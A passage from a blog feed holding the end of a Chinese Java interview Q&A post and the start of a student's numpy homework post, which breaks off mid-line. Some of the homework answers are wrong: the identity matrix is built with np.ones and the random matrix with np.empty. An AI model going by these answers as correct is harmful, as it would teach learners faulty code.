href="#是否可以在-static-环境中访问非-static-变量？" class="headerlink" title="是否可以在 static 环境中访问非 static 变量？"></a>是否可以在 static 环境中访问非 static 变量？</h4><blockquote><p>static 变量在 Java 中是属于类的，它在所有的实例中的值是一样的。当类被 Java 虚拟机载入的时候，会对 static 变量进行初始化。<br>如果你的代码尝试不用实例来访问非 static 的变量，编译器会报错，因为这些变量还没有被创建出来，还没有跟任何实例关联上。</p></blockquote><h4 id="char-型变量中能不能存贮一个中文汉字？为什么？"><a href="#char-型变量中能不能存贮一个中文汉字？为什么？" class="headerlink" title="char 型变量中能不能存贮一个中文汉字？为什么？"></a>char 型变量中能不能存贮一个中文汉字？为什么？</h4><blockquote><p>在 Java 语言中，char 类型占 2 个字节，而且 Java 默认采用 Unicode 编码，一个 Unicode 码是 16 位，所以一个 Unicode 码占两个字节，Java 中无论汉字还是英文字母，都是用 Unicode 编码来表<br>示的。所以，在 Java 中，char 类型变量可以存储一个中文汉字。</p></blockquote><h4 id="String、StringBuffer、StringBuilder-的区别？"><a href="#String、StringBuffer、StringBuilder-的区别？" class="headerlink" title="String、StringBuffer、StringBuilder 的区别？"></a>String、StringBuffer、StringBuilder 的区别？</h4><blockquote><ol><li>String ，是只读字符串，也就意味着 String 引用的字符串内容是不能被改变的<br>(每次对 String 类型进行改变的时候，都会生成一个新的 String 对象，然后将指针指向新的 String 对象。)</li><li>StringBuffer/StringBuilder 类，表示的字符串对象可以直接进行修改。StringBuilder 是 Java 5 中引入的，它和 StringBuffer 的方法完全相同，区别在于它是在单线程环境下使用的，因为它的<br>所有方面都没有被 synchronized 修饰，因此它的效率也比 StringBuffer 要高。<br>(StringBuffer 每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象并改变对象引用。<br>相同情况下使用 StirngBuilder 相比使用 StringBuffer 仅能获得 10%~15% 左右的性能提升，但却要冒多线程不安全的风险)</li></ol></blockquote><h4 id="String-s-new-String-“xyz”-会创建几个对象？"><a href="#String-s-new-String-“xyz”-会创建几个对象？" class="headerlink" title="String s = new String(“xyz”) 会创建几个对象？"></a>String s = new String(“xyz”) 会创建几个对象？</h4><blockquote><p>首先，在 String 池内找，找到 “xyz” 字符串，不创建 “xyz” 对应的 String 对象，否则创建一个对象。<br>然后，遇到 new 关键字，在内存上创建 String 对象，并将其返回给 s ，又一个对象。<br>所以，总共是 1 个或者 2 个对象。</p></blockquote><h4 id="什么是自动拆装箱？"><a href="#什么是自动拆装箱？" class="headerlink" title="什么是自动拆装箱？"></a>什么是自动拆装箱？</h4><blockquote><p>自动装箱和拆箱，就是基本类型和引用类型之间的转换。</p></blockquote><h5 id="为什么要转换？"><a href="#为什么要转换？" class="headerlink" title="为什么要转换？"></a>为什么要转换？</h5><blockquote><p>如果你在 Java5 下进行过编程的话，你一定不会陌生这一点，你不能直接地向集合( Collection )中放入原始类型值，因为集合只接收对象。</p><ol><li>通常这种情况下你的做法是，将这些原始类型的值转换成对象，然后将这些转换的对象放入集合中。使用 Integer、Double、Boolean 等这些类，我们可以将原始类型值转换成对应的对象，但是从某些程度可<br>能使得代码不是那么简洁精炼。</li><li>为了让代码简练，Java5 引入了具有在原始类型和对象类型自动转换的装箱和拆箱机制。<br>但是自动装箱和拆箱并非完美，在使用时需要有一些注意事项，如果没有搞明白自动装箱和拆箱，可能会引起难以察觉的 Bug 。</li></ol></blockquote><h4 id="equals-与-的区别？"><a href="#equals-与-的区别？" class="headerlink" title="equals 与 == 的区别？"></a>equals 与 == 的区别？</h4><blockquote><p>值类型（int,char,long,boolean 等）的话<br>都是用 == 判断相等性。<br>对象引用的话<br>= 判断引用所指的对象是否是同一个。<br>equals 方法，是 Object 的成员函数，有些类会覆盖(override) 这个方法，用于判断对象的等价性。<br>例如 String 类，两个引用所指向的 String 都是 “abc” ，但可能出现他们实际对应的对象并不是同一个（和 JVM 实现方式有关），因此用 == 判断他们可能不相等，但用 equals<br>方法判断一定是相等的。</p></blockquote><h4 id="如何在父类中为子类自动完成所有的-hashCode-和-equals-实现？这么做有何优劣"><a href="#如何在父类中为子类自动完成所有的-hashCode-和-equals-实现？这么做有何优劣" class="headerlink" title="如何在父类中为子类自动完成所有的 hashCode 和 equals 实现？这么做有何优劣"></a>如何在父类中为子类自动完成所有的 hashCode 和 equals 实现？这么做有何优劣</h4><blockquote><p>父类的 equals ，一般情况下是无法满足子类的 equals 的需求。<br>比如所有的对象都继承 Object ，默认使用的是 Object 的 equals 方法，在比较两个对象的时候，是看他们是否指向同一个地址。但是我们的需求是对象的某个属性相同，就相等了，而默认的 equals 方法<br>满足不了当前的需求，所以我们要重写 equals 方法。<br>如果重写了 equals 方法，就必须重写 hashCode 方法，否则就会降低 Map 等集合的索引速度</p></blockquote><h5 id="equals-方法，用于比较对象的内容是否相等"><a href="#equals-方法，用于比较对象的内容是否相等" class="headerlink" title="equals 方法，用于比较对象的内容是否相等"></a>equals 方法，用于比较对象的内容是否相等</h5><blockquote><p>当覆盖了 equals 方法时，比较对象是否相等将通过覆盖后的 equals 方法进行比较（判断对象的内容是否相等）。</p></blockquote><h5 id="hashCode-方法，大多在集合中用到。"><a href="#hashCode-方法，大多在集合中用到。" class="headerlink" title="hashCode 方法，大多在集合中用到。"></a>hashCode 方法，大多在集合中用到。</h5><blockquote><p>将对象放入到集合中时，首先判断要放入对象的 hashCode 值与集合中的任意一个元素的 hashCode 值是否相等，如果不相等直接将该对象放入集合中。<br>如果 hashCode 值相等，然后再通过 equals 方法判断要放入对象与集合中的任意一个对象是否相等，如果 equals 判断不相等，直接将该元素放入到集合中，否则不放入。</p></blockquote><h5 id="有没有可能-2-个不相等的对象有相同的-hashCode？"><a href="#有没有可能-2-个不相等的对象有相同的-hashCode？" class="headerlink" title="有没有可能 2 个不相等的对象有相同的 hashCode？"></a>有没有可能 2 个不相等的对象有相同的 hashCode？</h5><blockquote><p>可能会发生，这个被称为哈希碰撞。当然，相等的对象，即我们重写了 equals 方法，一定也要重写 hashCode 方法，否则将出现我们在 HashMap 中，相等的对象作为 key ，将找不到对应的 value 。<br>· equals 不相等，hashCode 可能相等。<br>· equals 相等，请重写 hashCode 方法，保证 hashCode 相等。</p></blockquote><h4 id="final、finally、finalize-的区别？"><a href="#final、finally、finalize-的区别？" class="headerlink" title="final、finally、finalize 的区别？"></a>final、finally、finalize 的区别？</h4><h5 id="final是修饰符关键字"><a href="#final是修饰符关键字" class="headerlink" title="final是修饰符关键字"></a>final是修饰符关键字</h5><blockquote><p>一个类被声明为 final ，意味着它不能再派生出新的子类，不能作为父类被继承。因此一个类不能既被声明为 abstract 的，又被声明为 final 的。<br>将变量或方法声明为 final ，可以保证它们在使用中不被改变。被声明为 final 的变量必须在声明时给定初值，而在以后的引用中只能读取，不可修改。被声明为 final 的方法也同样只能使用，不能重写。</p></blockquote><h5 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h5><blockquote><p>异常处理时提供 finally 块来执行任何清除操作。如果抛出一个异常，那么相匹配的 catch 子句就会执行，然后控制就会进入 finally 块（如果有的话）。<br>在以下 4 种特殊情况下，finally块不会被执行：</p><ol><li>在 finally 语句块中发生了异常。</li><li>在前面的代码中用了 System.exit() 退出程序。</li><li>程序所在的线程死亡。</li><li>关闭 CPU 。</li></ol></blockquote><h5 id="finalize-是方法名"><a href="#finalize-是方法名" class="headerlink" title="finalize 是方法名"></a>finalize 是方法名</h5><blockquote><p>Java 允许使用 #finalize() 方法，在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。这个方法是由垃圾收集器在确定这个对象没有被引用时对这个对象调用的。<br>它是在 Object 类中定义的，因此所有的类都继承了它。<br>子类覆盖 finalize() 方法，以整理系统资源或者执行其他清理工作。</p><p>#finalize() 方法，是在垃圾收集器删除对象之前对这个对象调用的。</p></blockquote><h5 id="String-类能被继承吗，为什么？"><a href="#String-类能被继承吗，为什么？" class="headerlink" title="String 类能被继承吗，为什么？"></a>String 类能被继承吗，为什么？</h5><blockquote><p>不能，因为 String 是 final 修饰</p></blockquote><h4 id="抽象类和接口有什么区别？"><a href="#抽象类和接口有什么区别？" class="headerlink" title="抽象类和接口有什么区别？"></a>抽象类和接口有什么区别？</h4><blockquote><p>从设计层面来说，抽象是对类的抽象，是一种模板设计，接口是行为的抽象，是一种行为的规范。</p></blockquote><h4 id="请详细讲述一下-RandomAccess-接口有什么作用？"><a href="#请详细讲述一下-RandomAccess-接口有什么作用？" class="headerlink" title="请详细讲述一下 RandomAccess 接口有什么作用？"></a>请详细讲述一下 RandomAccess 接口有什么作用？</h4><blockquote><p>RandomAccess 用来当标记的，是一种标记接口，接口的非典型用法。意思是，随机访问任意下标元素都比较快。<br>用处，当要实现某些算法时，会判断当前类是否实现了 RandomAccess 接口，会根据结果选择不同的算法</p></blockquote><h4 id="讲讲类的实例化顺序？"><a href="#讲讲类的实例化顺序？" class="headerlink" title="讲讲类的实例化顺序？"></a>讲讲类的实例化顺序？</h4><ol><li>父类静态变量</li><li>父类静态代码块</li><li>子类静态变量、</li><li>子类静态代码块</li><li>父类非静态变量（父类实例成员变量）</li><li>父类构造函数</li><li>子类非静态变量（子类实例成员变量）</li><li>子类构造函数<h4 id="什么是内部类？"><a href="#什么是内部类？" class="headerlink" title="什么是内部类？"></a>什么是内部类？</h4><blockquote><p>简单的说，就是在一个类、接口或者方法的内部创建另一个类。</p></blockquote><h5 id="内部类的作用是什么？"><a href="#内部类的作用是什么？" class="headerlink" title="内部类的作用是什么？"></a>内部类的作用是什么？</h5><blockquote><p>内部类提供了更好的封装，除了该外围类，其他类都不能访问。</p></blockquote><h5 id="Anonymous-Inner-Class-匿名内部类-是否可以继承其它类？是否可以实现接口"><a href="#Anonymous-Inner-Class-匿名内部类-是否可以继承其它类？是否可以实现接口" class="headerlink" title="Anonymous Inner Class(匿名内部类)是否可以继承其它类？是否可以实现接口"></a>Anonymous Inner Class(匿名内部类)是否可以继承其它类？是否可以实现接口</h5><blockquote><p>可以继承其他类或实现其他接口，在 Java 集合的流式操作中，我们常常这么干</p></blockquote><h5 id="内部类可以引用它的包含类（外部类）的成员吗？有没有什么限制"><a href="#内部类可以引用它的包含类（外部类）的成员吗？有没有什么限制" class="headerlink" title="内部类可以引用它的包含类（外部类）的成员吗？有没有什么限制"></a>内部类可以引用它的包含类（外部类）的成员吗？有没有什么限制</h5><blockquote><p>一个内部类对象可以访问创建它的外部类对象的成员，包括私有成员。</p></blockquote><h4 id="什么是-Java-IO-？"><a href="#什么是-Java-IO-？" class="headerlink" title="什么是 Java IO ？"></a>什么是 Java IO ？</h4><blockquote><p>Java IO 相关的类，在 java.io 包下，具体操作分成面向字节(Byte)和面向字符(Character)两种方式</p></blockquote><h5 id="什么是-Java-序列化？"><a href="#什么是-Java-序列化？" class="headerlink" title="什么是 Java 序列化？"></a>什么是 Java 序列化？</h5><blockquote><p>序列化就是一种用来处理对象流的机制，所谓对象流也就是将对象的内容进行流化。<br>· 可以对流化后的对象进行读写操作，也可将流化后的对象传输于网络之间。<br>· 序列化是为了解决在对对象流进行读写操作时所引发的问题。</p></blockquote><h5 id="如何实现-Java-序列化？"><a href="#如何实现-Java-序列化？" class="headerlink" title="如何实现 Java 序列化？"></a>如何实现 Java 序列化？</h5><blockquote><p>将需要被序列化的类，实现 Serializable 接口，该接口没有需要实现的方法，implements Serializable 只是为了标注该对象是可被序列化的。<br>序列化<br>· 然后，使用一个输出流(如：FileOutputStream)来构造一个 ObjectOutputStream(对象流)对象<br>· 接着，使用 ObjectOutputStream 对象的 #writeObject(Object obj) 方法，就可以将参数为 obj 的对象写出(即保存其状态)。<br>反序列化<br>要恢复的话则用输入流</p></blockquote><h5 id="Java-序列话中，如果有些字段不想进行序列化怎么办？"><a href="#Java-序列话中，如果有些字段不想进行序列化怎么办？" class="headerlink" title="Java 序列话中，如果有些字段不想进行序列化怎么办？"></a>Java 序列话中，如果有些字段不想进行序列化怎么办？</h5><blockquote><p>对于不想进行序列化的变量，使用 transient 关键字修饰。</p></blockquote><h4 id="如何实现对象克隆？"><a href="#如何实现对象克隆？" class="headerlink" title="如何实现对象克隆？"></a>如何实现对象克隆？</h4><blockquote><ol><li>实现 Cloneable 接口，并重写 Object 类中的 #clone() 方法。可以实现浅克隆，也可以实现深克隆。</li><li>实现 Serializable 接口，通过对象的序列化和反序列化实现克隆。可以实现真正的深克隆。</li></ol></blockquote><h5 id="浅克隆"><a href="#浅克隆" class="headerlink" title="浅克隆"></a>浅克隆</h5><blockquote><p>浅度克隆对于要克隆的对象，对于其基本数据类型的属性，复制一份给新产生的对象，对于非基本数据类型的属性，仅仅复制一份引用给新产生的对象，即新产生的对象和原始对象中的非基本数据类型的属性指<br>向的是同一个对象</p></blockquote><h5 id="深克隆"><a href="#深克隆" class="headerlink" title="深克隆"></a>深克隆</h5><blockquote><p>在浅度克隆的基础上，对于要克隆的对象中的非基本数据类型的属性对应的类，也实现克隆，这样对于非基本数据类型的属性，复制的不是一份引用，即新产生的对象和原始对象中的非基本数据类型的属性指向<br>的不是同一个对象</p></blockquote><h5 id="深克隆，浅克隆最大的区别在于新生成的克隆对象中的非基本数据类型是否是一个对象"><a href="#深克隆，浅克隆最大的区别在于新生成的克隆对象中的非基本数据类型是否是一个对象" class="headerlink" title="深克隆，浅克隆最大的区别在于新生成的克隆对象中的非基本数据类型是否是一个对象"></a>深克隆，浅克隆最大的区别在于新生成的克隆对象中的非基本数据类型是否是一个对象</h5></li></ol><h4 id="error-和-exception-有什么区别？CheckedException-和-RuntimeException-有什么区别？"><a href="#error-和-exception-有什么区别？CheckedException-和-RuntimeException-有什么区别？" class="headerlink" title="error 和 exception 有什么区别？CheckedException 和 RuntimeException 有什么区别？"></a>error 和 exception 有什么区别？CheckedException 和 RuntimeException 有什么区别？</h4><blockquote><p>Java 的异常体系，基于共同的祖先 java.lang.Throwable 类</p></blockquote><h5 id="Error（错误）"><a href="#Error（错误）" class="headerlink" title="Error（错误）"></a>Error（错误）</h5><blockquote><p>表示系统级的错误和程序不必处理的异常，是 Java 运行环境中的内部错误或者硬件问题。<br>例如：内存资源不足等。<br>对于这种错误，程序基本无能为力，除了退出运行外别无选择，它是由 Java 虚拟机抛出的。</p></blockquote><h5 id="Exception（异常），"><a href="#Exception（异常），" class="headerlink" title="Exception（异常），"></a>Exception（异常），</h5><blockquote><p>表示需要捕捉或者需要程序进行处理的异常，它处理的是因为程序设计的瑕疵而引起的问题或者在外的输入等引起的一般性问题，是程序必须处理的。Exception 又分为运行时异常，受检查异常。<br>RuntimeException(运行时异常)，表示无法让程序恢复的异常，导致的原因通常是因为执行了错误的操作，建议终止逻辑，因此，编译器不检查这些异常。<br>CheckedException(受检查异常)，是表示程序可以处理的异常，也即表示程序可以修复（由程序自己接受异常并且做出处理），所以称之为受检查异常</p></blockquote><h5 id="异常的使用的注意地方？"><a href="#异常的使用的注意地方？" class="headerlink" title="异常的使用的注意地方？"></a>异常的使用的注意地方？</h5><blockquote><ol><li>不要将异常处理用于正常的控制流（设计良好的 API 不应该强迫它的调用者为了正常的控制流而使用异常）。</li><li>对可以恢复的情况使用受检异常，对编程错误使用运行时异常。</li><li>避免不必要的使用受检异常（可以通过一些状态检测手段来避免异常的发生）。</li><li>优先使用标准的异常。</li><li>每个方法抛出的异常都要有文档。</li><li>保持异常的原子性。</li><li>不要在 catch 中忽略掉捕获到的异常。</li></ol></blockquote><h4 id="throw-与-throws-的区别-？"><a href="#throw-与-throws-的区别-？" class="headerlink" title="throw 与 throws 的区别 ？"></a>throw 与 throws 的区别 ？</h4><blockquote><p>throw ，用于在程序中显式地抛出一个异常。<br>throws ，用于指出在该方法中没有处理的异常。每个方法必须显式指明哪些异常没有处理，以便该方法的调用者可以预防可能发生的异常。最后，多个异常用逗号分隔。</p></blockquote><h4 id="异常处理中-finally-语句块的重要性"><a href="#异常处理中-finally-语句块的重要性" class="headerlink" title="异常处理中 finally 语句块的重要性"></a>异常处理中 finally 语句块的重要性</h4><blockquote><p>不管程序是否发生了异常, finally 语句块都会被执行，甚至当没有catch 声明但抛出了一个异常时, finally 语句块也会被执行。<br>finally 语句块通常用于释放资源, 如 I/O 缓冲区, 数据库连接等等</p></blockquote><h4 id="说说反射的用途及实现？"><a href="#说说反射的用途及实现？" class="headerlink" title="说说反射的用途及实现？"></a>说说反射的用途及实现？</h4><blockquote><p><a href="https://www.cnblogs.com/zhaopei/p/reflection.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaopei/p/reflection.html</a></p></blockquote><h5 id="java-反射机制主要提供了以下功能："><a href="#java-反射机制主要提供了以下功能：" class="headerlink" title="java 反射机制主要提供了以下功能："></a>java 反射机制主要提供了以下功能：</h5><blockquote><ol><li>在运行时构造一个类的对象。</li><li>判断一个类所具有的成员变量和方法。</li><li>调用一个对象的方法。</li><li>生成动态代理。</li></ol></blockquote><h5 id="反射的应用很多，很多框架都有用到："><a href="#反射的应用很多，很多框架都有用到：" class="headerlink" title="反射的应用很多，很多框架都有用到："></a>反射的应用很多，很多框架都有用到：</h5><blockquote><p>Spring 框架的 IoC 基于反射创建对象和设置依赖属性。<br>Spring MVC 的请求调用对应方法，也是通过反射。<br>JDBC 的 Class#forName(String className) 方法，也是使用反射。</p></blockquote><h5 id="反射中，Class-forName-和-ClassLoader-区别？"><a href="#反射中，Class-forName-和-ClassLoader-区别？" class="headerlink" title="反射中，Class.forName 和 ClassLoader 区别？"></a>反射中，Class.forName 和 ClassLoader 区别？</h5><p>这两者，都可用来对类进行加载。差别在于：</p><blockquote><ol><li>Class#forName(…) 方法，除了将类的 .class 文件加载到JVM 中之外，还会对类进行解释，执行类中的 static 块。</li><li>ClassLoader 只干一件事情，就是将 .class 文件加载到 JVM 中，不会执行 static 中的内容，只有在 newInstance 才会去执行 static 块。</li><li>Class#forName(name, initialize, loader) 方法，带参函数也可控制是否加载 static 块，并且只有调用了newInstance 方法采用调用构造函数，创建类的对象。</li></ol></blockquote><h5 id="UnsupportedOperationException-是什么？"><a href="#UnsupportedOperationException-是什么？" class="headerlink" title="UnsupportedOperationException 是什么？"></a>UnsupportedOperationException 是什么？</h5><blockquote><p>UnsupportedOperationException ，是用于表明操作不支持的异常。<br>在 JDK 类中已被大量运用，在集合框架java.util.Collections.UnmodifiableCollection 将会在所有 add 和 remove 操作中抛出这个异常</p></blockquote><h4 id="什么是注解"><a href="#什么是注解" class="headerlink" title="什么是注解"></a>什么是注解</h4><blockquote><p>Java注解又称为标注，是Java从1.5开始支持加入源码的特殊语法元数据；Java中的类、方法、变量、参数、包都可以被注解。</p></blockquote><h4 id="什么时候用断言（assert）？"><a href="#什么时候用断言（assert）？" class="headerlink" title="什么时候用断言（assert）？"></a>什么时候用断言（assert）？</h4><blockquote><p>断言，在软件开发中是一种常用的调试方式，很多开发语言中都支持这种机制。</p></blockquote><blockquote><p>一般来说，断言用于保证程序最基本、关键的正确性。断言检查通常在开发和测试时开启。为了保证程序的执行效率，在软件发布后断言检查通常是关闭的。<br>断言是一个包含布尔表达式的语句，在执行这个语句时假定该表达式为true；如果表达式的值为 false ，那么系统会报告一个AssertionError 错误。断言的使用如下面的代码所示：</p></blockquote><blockquote><p>assert(a &gt; 0); // throws an AssertionError if a &lt;= 0<br>断言可以有两种形式：<br>assert Expression1; 。<br>assert Expression1 : Expression2; 。<br>Expression1 应该总是产生一个布尔值。<br>Expression2 可以是得出一个值的任意表达式；这个值用于生成显示更多调试信息的字符串消息。<br>要在运行时启用断言，可以在启动 JVM 时使用 -enableassertions 或者 -ea 标记。要在运行时选择禁用断言，可以在启动 JVM 时使用 -da 或者 -disableassertions 标记。要在系统类中<br>启用或禁用断言，可使用 -esa 或 -dsa 标记。还可以在包的基础上启用或者禁用断言。<br>当然，实际场景下，我们会在 Spring 的源码中看到，它自己封装了 Assert 类，实现更方便的断言功能，并且，在生产环境下也启用。<br>另外，在单元测试中，也会使用自己封装的断言类，判断执行结果的正确与错误。</p></blockquote><h4 id="Java-对象创建的方式？"><a href="#Java-对象创建的方式？" class="headerlink" title="Java 对象创建的方式？"></a>Java 对象创建的方式？</h4><ol><li>使用 new 关键字创建对象。</li><li>使用 Class 类的 newInstance 方法(反射机制)。</li><li>使用 Constructor 类的 newInstance 方法(反射机制)。</li><li>使用 clone 方法创建对象。</li><li>使用(反)序列化机制创建对象<h3 id="Java基础面试网址集合"><a href="#Java基础面试网址集合" class="headerlink" title="Java基础面试网址集合"></a>Java基础面试网址集合</h3><a href="https://wiki.jikexueyuan.com/project/java-interview-bible/basic-concept.html" target="_blank" rel="noopener">极客学院</a><br><a href="https://www.ituring.com.cn/article/507089" target="_blank" rel="noopener">32道常见的Java基础面试题</a><br><a href="https://github.com/Snailclimb/JavaGuide/blob/3dc5234d3a77d134e4768b17cc864c4cc1030e41/Java%E7%9B%B8%E5%85%B3/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.md" target="_blank" rel="noopener">Java基础知识</a></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;[文章都是搬运艿艿的]&lt;br&gt;[&lt;a href=&quot;http://svip.iocoder.cn/Java/Core/Interview/]&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://svip.iocoder.cn/Java/Core/Interview/]&lt;/a&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>numpy学习</title>
    <link href="http://runindark.com/2020/03/04/numpy/"/>
    <id>http://runindark.com/2020/03/04/numpy/</id>
    <published>2020-03-04T10:59:24.638Z</published>
    <updated>2020-03-04T13:56:16.237Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>numpy作业<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h5 id="1-导入numpy库"><a href="#1-导入numpy库" class="headerlink" title="1.导入numpy库"></a>1.导入numpy库</h5><blockquote><p>import numpy as np</p></blockquote><h5 id="2-建立一个一维数组-a-初始化为-4-5-6-1-输出a-的类型（type）-2-输出a的各维度的大小（shape）-3-输出-a的第一个元素（值为4）"><a href="#2-建立一个一维数组-a-初始化为-4-5-6-1-输出a-的类型（type）-2-输出a的各维度的大小（shape）-3-输出-a的第一个元素（值为4）" class="headerlink" title="2. 建立一个一维数组 a 初始化为[4,5,6], (1)输出a 的类型（type）(2)输出a的各维度的大小（shape）(3)输出 a的第一个元素（值为4）"></a>2. 建立一个一维数组 a 初始化为[4,5,6], (1)输出a 的类型（type）(2)输出a的各维度的大小（shape）(3)输出 a的第一个元素（值为4）</h5><blockquote><p>a = np.array([4,5,6])<br>print(a.dtype)<br>print(a.shape)<br>print(a[0])</p></blockquote><h5 id="3-建立一个二维数组-b-初始化为-4-5-6-1-2-3-1-输出各维度的大小（shape）-2-输出-b-0-0-，b-0-1-b-1-1-这三个元素（对应值分别为4-5-2）"><a href="#3-建立一个二维数组-b-初始化为-4-5-6-1-2-3-1-输出各维度的大小（shape）-2-输出-b-0-0-，b-0-1-b-1-1-这三个元素（对应值分别为4-5-2）" class="headerlink" title="3. 建立一个二维数组 b,初始化为 [ [4, 5, 6],[1, 2, 3]] (1)输出各维度的大小（shape）(2)输出 b(0,0)，b(0,1),b(1,1) 这三个元素（对应值分别为4,5,2）"></a>3. 建立一个二维数组 b,初始化为 [ [4, 5, 6],[1, 2, 3]] (1)输出各维度的大小（shape）(2)输出 b(0,0)，b(0,1),b(1,1) 这三个元素（对应值分别为4,5,2）</h5><blockquote><p>a = np.array([[4,5,6],[1,2,3]])<br>print(a.shape)<br>print(a[0].shape)<br>print(a[1].shape)<br>print(a[0][0])<br>print(a[0][1])<br>print(a[1][1])</p></blockquote><h5 id="4-1-建立一个全0矩阵-a-大小为-3x3-类型为整型（提示-dtype-int）-2-建立一个全1矩阵b-大小为4x5-3-建立一个单位矩阵c-大小为4x4-4-生成一个随机数矩阵d-大小为-3x2"><a href="#4-1-建立一个全0矩阵-a-大小为-3x3-类型为整型（提示-dtype-int）-2-建立一个全1矩阵b-大小为4x5-3-建立一个单位矩阵c-大小为4x4-4-生成一个随机数矩阵d-大小为-3x2" class="headerlink" title="4.(1)建立一个全0矩阵 a, 大小为 3x3; 类型为整型（提示: dtype = int）(2)建立一个全1矩阵b,大小为4x5; (3)建立一个单位矩阵c ,大小为4x4; (4)生成一个随机数矩阵d,大小为 3x2"></a>4.(1)建立一个全0矩阵 a, 大小为 3x3; 类型为整型（提示: dtype = int）(2)建立一个全1矩阵b,大小为4x5; (3)建立一个单位矩阵c ,大小为4x4; (4)生成一个随机数矩阵d,大小为 3x2</h5><blockquote><p>a = np.zeros([3,3], dtype = int)<br>b = np.ones([4,5])<br>c = np.ones([4,4])<br>d = np.empty([3,2])<br>print(a,b,c,d)</p></blockquote><h5 id="5-建立一个数组-a-值为-1-2-3-4-5-6-7-8-9-10-11-12-1-打印a-2-输出-下标为-2-3-0-0-这两个数组元素的值"><a href="#5-建立一个数组-a-值为-1-2-3-4-5-6-7-8-9-10-11-12-1-打印a-2-输出-下标为-2-3-0-0-这两个数组元素的值" class="headerlink" title="5. 建立一个数组 a,(值为[[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]] ) ,(1)打印a; (2)输出 下标为(2,3),(0,0) 这两个数组元素的值"></a>5. 建立一个数组 a,(值为[[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]] ) ,(1)打印a; (2)输出 下标为(2,3),(0,0) 这两个数组元素的值</h5><blockquote><p>a = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]])<br>print(a[2][3])<br>print(a[0][0])</p></blockquote><h5 id="6-把上一题的-a数组的-0到1行-2到3列，放到b里面去，（此处不需要从新建立a-直接调用即可）-1-输出b-2-输出b-的（0-0）这个元素的值"><a href="#6-把上一题的-a数组的-0到1行-2到3列，放到b里面去，（此处不需要从新建立a-直接调用即可）-1-输出b-2-输出b-的（0-0）这个元素的值" class="headerlink" title="6.把上一题的 a数组的 0到1行 2到3列，放到b里面去，（此处不需要从新建立a,直接调用即可）(1),输出b;(2) 输出b 的（0,0）这个元素的值"></a>6.把上一题的 a数组的 0到1行 2到3列，放到b里面去，（此处不需要从新建立a,直接调用即可）(1),输出b;(2) 输出b 的（0,0）这个元素的值</h5><blockquote><p>b = a[0:2,2:4]<br>print(b)</p></blockquote><h6 id="7-把第5题中数组a的最后两行所有元素放到-c中，（提示：-a-1-2-）-1-输出-c-2-输出-c-中第一行的最后一个元素（提示，使用-1-表示最后一个元素）"><a href="#7-把第5题中数组a的最后两行所有元素放到-c中，（提示：-a-1-2-）-1-输出-c-2-输出-c-中第一行的最后一个元素（提示，使用-1-表示最后一个元素）" class="headerlink" title="7.把第5题中数组a的最后两行所有元素放到 c中，（提示： a[1:2, :]）(1)输出 c ; (2) 输出 c 中第一行的最后一个元素（提示，使用 -1 表示最后一个元素）"></a>7.把第5题中数组a的最后两行所有元素放到 c中，（提示： a[1:2, :]）(1)输出 c ; (2) 输出 c 中第一行的最后一个元素（提示，使用 -1 表示最后一个元素）</h6><blockquote><p>c = a[1:3]<br>print(c)<br>print(c[-1][-1])</p></blockquote><h5 id="8-建立数组a-初始化a为-1-2-3-4-5-6-，输出-（0-0）（1-1）（2-0）这三个元素（提示：-使用-print-a-0-1-2-0-1-0-）"><a href="#8-建立数组a-初始化a为-1-2-3-4-5-6-，输出-（0-0）（1-1）（2-0）这三个元素（提示：-使用-print-a-0-1-2-0-1-0-）" class="headerlink" title="8.建立数组a,初始化a为[[1, 2], [3, 4], [5, 6]]，输出 （0,0）（1,1）（2,0）这三个元素（提示： 使用 print(a[[0, 1, 2], [0, 1, 0]]) ）"></a>8.建立数组a,初始化a为[[1, 2], [3, 4], [5, 6]]，输出 （0,0）（1,1）（2,0）这三个元素（提示： 使用 print(a[[0, 1, 2], [0, 1, 0]]) ）</h5><blockquote><p>a = np.array([[1, 2], [3, 4], [5, 6]])<br>print(a[0,1])<br>print(a[1,1])<br>print(a[2,0])</p></blockquote><h5 id="9-建立矩阵a-初始化为-1-2-3-4-5-6-7-8-9-10-11-12-，输出-0-0-1-2-2-0-3-1-提示使用-b-np-array-0-2-0-1-print-a-np-arange-4-b"><a href="#9-建立矩阵a-初始化为-1-2-3-4-5-6-7-8-9-10-11-12-，输出-0-0-1-2-2-0-3-1-提示使用-b-np-array-0-2-0-1-print-a-np-arange-4-b" class="headerlink" title="9.建立矩阵a ,初始化为[[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]，输出(0,0),(1,2),(2,0),(3,1) (提示使用 b = np.array([0, 2, 0, 1]) print(a[np.arange(4), b]))"></a>9.建立矩阵a ,初始化为[[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]，输出(0,0),(1,2),(2,0),(3,1) (提示使用 b = np.array([0, 2, 0, 1]) print(a[np.arange(4), b]))</h5><blockquote><p>a = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]])<br>b = np.array([0,2,0,1])<br>print(a[np.arange(4),b])</p></blockquote><h5 id="10-对9-中输出的那四个元素，每个都加上10，然后重新输出矩阵a-提示：-a-np-arange-4-b-10-）"><a href="#10-对9-中输出的那四个元素，每个都加上10，然后重新输出矩阵a-提示：-a-np-arange-4-b-10-）" class="headerlink" title="10.对9 中输出的那四个元素，每个都加上10，然后重新输出矩阵a.(提示： a[np.arange(4), b] += 10 ）"></a>10.对9 中输出的那四个元素，每个都加上10，然后重新输出矩阵a.(提示： a[np.arange(4), b] += 10 ）</h5><blockquote><p>print(a[np.arange(4),b] + 